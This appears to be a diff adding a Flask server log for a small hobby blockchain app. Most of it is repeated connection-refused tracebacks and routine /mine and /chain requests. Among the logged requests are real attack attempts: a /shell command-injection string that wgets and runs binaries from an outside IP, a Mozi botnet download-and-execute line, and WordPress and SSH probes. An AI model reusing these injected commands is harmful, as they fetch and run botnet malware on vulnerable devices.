+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 218, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x72c9e8f50bc0>: Failed to establish a new connection: [Errno 111] Connection refused
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 486, in send
+    resp = conn.urlopen(
+           ^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 845, in urlopen
+    retries = retries.increment(
+              ^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/util/retry.py", line 515, in increment
+    if new_retry.is_exhausted():
+        ^^^^^^^^^^^^^^^^^^^^^^^^^
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='localhost', port=5000): Max retries exceeded with url: /chain (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x72c9e8f50bc0>: Failed to establish a new connection: [Errno 111] Connection refused'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/schndr/schndr_blockchain.py", line 277, in consensus
+    replaced = blockchain.resolve_conflicts()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/schndr/schndr_blockchain.py", line 83, in resolve_conflicts
+    response = requests.get(f'http://{node}/chain')
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 73, in get
+    return request("get", url, params=params, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 59, in request
+    return session.request(method=method, url=url, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 589, in request
+    resp = self.send(prep, **send_kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 703, in send
+    r = adapter.send(request, **kwargs)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='localhost', port=5000): Max retries exceeded with url: /chain (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x72c9e8f50bc0>: Failed to establish a new connection: [Errno 111] Connection refused'))
+217.80.134.196 - - [07/Feb/2025 08:51:22] "GET /nodes/resolve HTTP/1.1" 500 -
+217.80.134.196 - - [07/Feb/2025 08:51:22] "GET /favicon.ico HTTP/1.1" 404 -
+54.86.50.139 - - [07/Feb/2025 08:52:03] "GET /chain HTTP/1.1" 200 -
+54.86.50.139 - - [07/Feb/2025 08:52:14] "GET /mine HTTP/1.1" 200 -
+54.86.50.139 - - [07/Feb/2025 08:52:18] "GET /mine HTTP/1.1" 200 -
+54.86.50.139 - - [07/Feb/2025 08:52:19] "GET /mine HTTP/1.1" 200 -
+54.86.50.139 - - [07/Feb/2025 08:52:24] "GET /chain HTTP/1.1" 200 -
+[2025-02-07 08:52:35,831] ERROR in app: Exception on /nodes/resolve [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 203, in _new_conn
+    sock = connection.create_connection(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 85, in create_connection
+    raise err
+  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 73, in create_connection
+    sock.connect(sa)
+ConnectionRefusedError: [Errno 111] Connection refused
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 791, in urlopen
+    response = self._make_request(
+               ^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 497, in _make_request
+    conn.request(
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 395, in request
+    self.endheaders()
+  File "/usr/lib/python3.12/http/client.py", line 1331, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "/usr/lib/python3.12/http/client.py", line 1091, in _send_output
+    self.send(msg)
+  File "/usr/lib/python3.12/http/client.py", line 1035, in send
+    self.connect()
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 243, in connect
+    self.sock = self._new_conn()
+                ^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 218, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x72c9e8f66030>: Failed to establish a new connection: [Errno 111] Connection refused
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 486, in send
+    resp = conn.urlopen(
+           ^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 845, in urlopen
+    retries = retries.increment(
+              ^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/util/retry.py", line 515, in increment
+    if new_retry.is_exhausted():
+        ^^^^^^^^^^^^^^^^^^^^^^^^^
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='localhost', port=5000): Max retries exceeded with url: /chain (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x72c9e8f66030>: Failed to establish a new connection: [Errno 111] Connection refused'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/schndr/schndr_blockchain.py", line 277, in consensus
+    replaced = blockchain.resolve_conflicts()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/schndr/schndr_blockchain.py", line 83, in resolve_conflicts
+    response = requests.get(f'http://{node}/chain')
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 73, in get
+    return request("get", url, params=params, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 59, in request
+    return session.request(method=method, url=url, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 589, in request
+    resp = self.send(prep, **send_kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 703, in send
+    r = adapter.send(request, **kwargs)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='localhost', port=5000): Max retries exceeded with url: /chain (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x72c9e8f66030>: Failed to establish a new connection: [Errno 111] Connection refused'))
+54.86.50.139 - - [07/Feb/2025 08:52:35] "GET /nodes/resolve HTTP/1.1" 500 -
+217.80.134.196 - - [07/Feb/2025 08:52:50] "GET /mine HTTP/1.1" 200 -
+172.71.99.65 - - [07/Feb/2025 08:56:36] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 404 -
+172.69.150.60 - - [07/Feb/2025 08:56:59] "GET /wp-admin/setup-config.php HTTP/1.1" 404 -
+15.204.194.30 - - [07/Feb/2025 09:08:09] "GET / HTTP/1.1" 200 -
+135.148.195.3 - - [07/Feb/2025 09:08:28] "GET /favicon.ico HTTP/1.1" 404 -
+217.80.134.196 - - [07/Feb/2025 09:15:05] "GET / HTTP/1.1" 200 -
+[2025-02-07 09:15:17,810] ERROR in app: Exception on /nodes/resolve [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 203, in _new_conn
+    sock = connection.create_connection(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 85, in create_connection
+    raise err
+  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 73, in create_connection
+    sock.connect(sa)
+ConnectionRefusedError: [Errno 111] Connection refused
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 791, in urlopen
+    response = self._make_request(
+               ^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 497, in _make_request
+    conn.request(
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 395, in request
+    self.endheaders()
+  File "/usr/lib/python3.12/http/client.py", line 1331, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "/usr/lib/python3.12/http/client.py", line 1091, in _send_output
+    self.send(msg)
+  File "/usr/lib/python3.12/http/client.py", line 1035, in send
+    self.connect()
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 243, in connect
+    self.sock = self._new_conn()
+                ^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 218, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x72c9e8f64e00>: Failed to establish a new connection: [Errno 111] Connection refused
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 486, in send
+    resp = conn.urlopen(
+           ^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 845, in urlopen
+    retries = retries.increment(
+              ^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/util/retry.py", line 515, in increment
+    if new_retry.is_exhausted():
+        ^^^^^^^^^^^^^^^^^^^^^^^^^
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='localhost', port=5000): Max retries exceeded with url: /chain (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x72c9e8f64e00>: Failed to establish a new connection: [Errno 111] Connection refused'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/schndr/schndr_blockchain.py", line 277, in consensus
+    replaced = blockchain.resolve_conflicts()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/schndr/schndr_blockchain.py", line 83, in resolve_conflicts
+    response = requests.get(f'http://{node}/chain')
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 73, in get
+    return request("get", url, params=params, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 59, in request
+    return session.request(method=method, url=url, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 589, in request
+    resp = self.send(prep, **send_kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 703, in send
+    r = adapter.send(request, **kwargs)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='localhost', port=5000): Max retries exceeded with url: /chain (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x72c9e8f64e00>: Failed to establish a new connection: [Errno 111] Connection refused'))
+217.80.134.196 - - [07/Feb/2025 09:15:17] "GET /nodes/resolve HTTP/1.1" 500 -
+217.80.134.196 - - [07/Feb/2025 09:15:17] "GET /favicon.ico HTTP/1.1" 404 -
+217.80.134.196 - - [07/Feb/2025 09:15:22] "GET /nodes/register HTTP/1.1" 405 -
+217.80.134.196 - - [07/Feb/2025 09:15:30] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:15:32] "GET /chain HTTP/1.1" 200 -
+172.71.98.137 - - [07/Feb/2025 09:16:38] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 404 -
+172.68.193.199 - - [07/Feb/2025 09:17:25] "GET /wp-admin/setup-config.php HTTP/1.1" 404 -
+109.74.198.141 - - [07/Feb/2025 09:27:04] "GET / HTTP/1.1" 200 -
+109.74.198.141 - - [07/Feb/2025 09:27:04] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+109.74.198.141 - - [07/Feb/2025 09:27:04] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03\x1d].Kj\x99Ù«\x9bnÜûwW\x92Òê|Ú\x09\x16¡÷h0,¶\x15ÔÃÆD k(\x89ü\x1ci3*|K`Hv+Ì\x98¤°äO\x85\x17ðG)s¶\x93\x87\x07²c\x00$\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨À$À(À#À'\x00\x9f\x00\x9e\x00k\x00g\x00ÿ\x01\x00\x00\x8b\x00\x0b\x00\x04\x03\x00\x01\x02\x00" 400 -
+109.74.198.141 - - [07/Feb/2025 09:27:04] code 400, message Bad request version ('BtD¢ípª)')
+109.74.198.141 - - [07/Feb/2025 09:27:04] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x037ÍÉ¹\x1eä`Ñ\x81*|¥\\\x89\x8b}ÒÁ\x86.ScoV\x8aBÆ*@<MÝ Ùâ×k\x1dBtD¢ípª)" 400 -
+109.74.198.141 - - [07/Feb/2025 09:27:04] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+109.74.198.141 - - [07/Feb/2025 09:27:04] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03`ì°½½ìv\x08ÕtÕ\x07\x1f'ëçB\x98)KÆÄ\x81C\x9cê\x8eü×Ó¯¤ ï/MÞðVz\x82\x91P7uÖç^¸Z\\æ{´Ó§½B\x9f\x8c\x9b±\x16Øl\x00$\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨À$À(À#À'\x00\x9f\x00\x9e\x00k\x00g\x00ÿ\x01\x00\x00\x8b\x00\x0b\x00\x04\x03\x00\x01\x02\x00" 400 -
+217.80.134.196 - - [07/Feb/2025 09:31:08] "GET /chain HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:31:08] "GET /favicon.ico HTTP/1.1" 404 -
+217.80.134.196 - - [07/Feb/2025 09:31:09] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:31:17] "GET / HTTP/1.1" 200 -
+141.98.11.35 - - [07/Feb/2025 09:33:22] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+drea4+efefa7;wget+http:/\\/176.65.140.135/efefa7;chmod+777+efefa7;./efefa7+jaws;wget+http:/\\/176.65.140.135/drea4;chmod+777+drea4;./drea4+jaws HTTP/1.1" 404 -
+217.80.134.196 - - [07/Feb/2025 09:34:51] "GET /chain HTTP/1.1" 200 -
+123.194.115.33 - - [07/Feb/2025 09:34:55] "GET / HTTP/1.1" 200 -
+123.194.115.33 - - [07/Feb/2025 09:34:55] "GET /favicon.ico HTTP/1.1" 404 -
+123.194.115.33 - - [07/Feb/2025 09:34:56] "GET /favicon.ico HTTP/1.1" 404 -
+162.158.103.103 - - [07/Feb/2025 09:36:32] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 404 -
+172.71.95.114 - - [07/Feb/2025 09:37:05] "GET /wp-admin/setup-config.php HTTP/1.1" 404 -
+217.80.134.196 - - [07/Feb/2025 09:39:09] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:12] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:14] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:16] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:19] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:20] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:21] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:22] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:23] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:26] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:27] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:30] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:31] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:32] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:33] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:34] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:35] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:35] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:40:39] "GET /chain HTTP/1.1" 200 -
+95.214.55.132 - - [07/Feb/2025 09:44:09] "GET / HTTP/1.1" 200 -
+57.129.64.10 - - [07/Feb/2025 09:53:20] code 400, message Bad request version ('À\x14À')
+57.129.64.10 - - [07/Feb/2025 09:53:20] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x7f\x1fh×ñ\x07£à\x11\x83\x0b·¦\x96]\x82õ§d\x02E\x8f\x98\x7f\\üèÄ¶\x81x>\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" 400 -
+217.80.134.196 - - [07/Feb/2025 09:53:39] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:53:39] "GET /favicon.ico HTTP/1.1" 404 -
+217.80.134.196 - - [07/Feb/2025 09:53:42] "GET / HTTP/1.1" 200 -
+179.43.191.146 - - [07/Feb/2025 09:54:07] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:54:08] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:54:12] "GET /mine HTTP/1.1" 200 -
+ * Serving Flask app 'schndr_blockchain'
+ * Debug mode: off
+Address already in use
+Port 80 is in use by another program. Either identify and stop that program, or start the server with a different port.
+217.80.134.196 - - [07/Feb/2025 09:54:46] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:54:46] "GET /favicon.ico HTTP/1.1" 404 -
+217.80.134.196 - - [07/Feb/2025 09:54:49] "GET /mine HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:54:49] "GET /mne HTTP/1.1" 404 -
+217.80.134.196 - - [07/Feb/2025 09:54:53] "GET /mine HTTP/1.1" 200 -
+172.70.248.103 - - [07/Feb/2025 09:54:54] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 404 -
+217.80.134.196 - - [07/Feb/2025 09:55:02] "GET /chain HTTP/1.1" 200 -
+172.70.242.124 - - [07/Feb/2025 09:55:36] "GET /wp-admin/setup-config.php HTTP/1.1" 404 -
+87.236.176.187 - - [07/Feb/2025 09:55:40] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:57:28] "GET /chain HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 09:57:28] "GET /favicon.ico HTTP/1.1" 404 -
+217.80.134.196 - - [07/Feb/2025 09:57:53] "GET /mine HTTP/1.1" 200 -
+117.235.104.98 - - [07/Feb/2025 10:02:15] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+117.235.104.98 - - [07/Feb/2025 10:02:15] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 -
+57.129.64.10 - - [07/Feb/2025 10:03:35] code 400, message Bad request syntax ('SSH-2.0-Go')
+57.129.64.10 - - [07/Feb/2025 10:03:35] "SSH-2.0-Go" 400 -
+  File "/root/schndr/schndr_blockchain.py", line 87
+    chain = response.json()['chain']
+                                    ^
+IndentationError: unindent does not match any outer indentation level
+217.80.134.196 - - [07/Feb/2025 10:06:22] "GET /balance HTTP/1.1" 404 -
+217.80.134.196 - - [07/Feb/2025 10:06:27] "GET /balance HTTP/1.1" 404 -
+  File "/root/schndr/schndr_blockchain.py", line 87
+    chain = response.json()['chain']
+                                    ^
+IndentationError: unindent does not match any outer indentation level
+172.70.46.143 - - [07/Feb/2025 10:14:48] "GET /wp-admin/setup-config.php HTTP/1.1" 404 -
